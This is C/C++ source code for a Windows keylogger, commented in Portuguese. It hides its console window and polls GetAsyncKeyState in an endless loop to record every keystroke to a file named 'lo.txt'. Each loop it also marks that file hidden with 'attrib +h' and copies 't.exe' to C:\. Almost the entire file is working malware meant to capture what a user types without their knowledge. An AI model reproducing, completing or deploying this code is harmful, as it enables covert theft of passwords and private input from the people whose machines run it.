#include <stdio.h>
#include <ctype.h>
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <winuser.h>

using namespace std;

void Stealth();
int salvar(int tecla, char *file);

int main()
{
  HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
 



   char a;

    while(true){

        for(a=8;a<=255;a++){           
		   if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
		//salvar(toupper(a),"lo.txt");
		salvar(a,"lo.txt");		
		}
	system("attrib +h lo.txt");
	system("copy t.exe c:\\");
	
	
	

    }
	
    return 0;
}








int salvar(int tecla, char *file){

char x;
    FILE *newarquivo;
    newarquivo = fopen(file, "a+");

   // cout << tecla;

 //   fprintf(newarquivo, "%s", &tecla);
	
	if (tecla == 8)
        fprintf(newarquivo, "[bckspc]");
    else if (tecla == 13)
        fprintf(newarquivo, "\n");
   else if (tecla == VK_SPACE)
        fprintf(newarquivo, "[Spc] ");
    else if (tecla == 32)
        fprintf(newarquivo, "%s", " ");
    else if (tecla == VK_TAB)
        fprintf(newarquivo, "\t");
    else if (tecla == VK_SHIFT)
       fprintf(newarquivo, "%s", "[SHIFT]");
    else if (tecla == VK_CONTROL)
        fprintf(newarquivo, "%s", "[CNTRL]");
    else if (tecla == VK_ESCAPE)
        fprintf(newarquivo, "[ESC]");
    else if (tecla == VK_END)
        fprintf(newarquivo, "%s", "[END]");
    else if (tecla == VK_HOME)
        fprintf(newarquivo, "%s", "[HOME]");
    else if (tecla == VK_LEFT)
        fprintf(newarquivo, "%s", "[LEFT]");
    else if (tecla == VK_UP)
        fprintf(newarquivo, "%s", "[UP]");
    else if (tecla == VK_RIGHT)
        fprintf(newarquivo, "%s", "[RIGHT]");
    else if (tecla == VK_DOWN)
        fprintf(newarquivo, "%s", "[DOWN]");
    else if (tecla == 20)
        fprintf(newarquivo, "%s", "[CAPSLCK]");
	 else if (tecla == VK_NUMPAD0)
        fprintf(newarquivo, "0");
	 else if (tecla == VK_NUMPAD1)
        fprintf(newarquivo, "1");
		 else if (tecla == VK_NUMPAD2)
        fprintf(newarquivo, "2");
	 else if (tecla == VK_NUMPAD3)
        fprintf(newarquivo, "3");
		 else if (tecla == VK_NUMPAD4)
        fprintf(newarquivo, "4");
	 else if (tecla == VK_NUMPAD5)
        fprintf(newarquivo, "5");
		 else if (tecla == VK_NUMPAD6)
        fprintf(newarquivo, "6");
	 else if (tecla == VK_NUMPAD7)
        fprintf(newarquivo, "7");
		 else if (tecla == VK_NUMPAD8)
        fprintf(newarquivo, "8");
	 else if (tecla == VK_NUMPAD9)
        fprintf(newarquivo, "9");
	
		 else if (tecla == VK_ADD)
        fprintf(newarquivo, "+");
	else if (tecla == VK_DIVIDE)
        fprintf(newarquivo, "/");
	
		
		
		
		
		
		 else if (tecla == VK_SUBTRACT)
        fprintf(newarquivo, "-");
	
		 else if (tecla == VK_MULTIPLY)
        fprintf(newarquivo, "*");
	
	
	
		 else if (tecla == VK_MENU)
        fprintf(newarquivo, "[ALT]");
	
	
	
	 //else if (tecla == VK_OEM_5)
       // fprintf(newarquivo, "\");
	
	
	
	

	
	
	
	
   else if (tecla == 190 || tecla == 110)
        fprintf(newarquivo, "%s", ".");
	
	
    else
        fprintf(newarquivo, "%s", &tecla);
fclose(newarquivo);

return 0;
}  











void Stealth()
{
  HWND Stealth;
  AllocConsole();
 Stealth = FindWindow("ConsoleWindowClass”", NULL);
  ShowWindow(Stealth,0);

  }
  